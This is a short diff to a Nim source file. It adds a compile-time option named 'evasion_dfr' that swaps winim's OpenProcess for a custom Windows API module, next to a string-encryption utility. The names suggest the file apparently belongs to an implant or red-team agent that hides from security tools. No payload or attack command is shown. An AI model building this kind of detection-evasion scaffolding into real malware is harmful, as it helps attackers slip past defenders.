@@ -4,7 +4,11 @@ import ../utils/strenc
 import std/[json, strformat, strutils]
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except OpenProcess
+    import ../utils/winapi
+  else:
+    import winim/lean
 else:
   import std/osproc
 
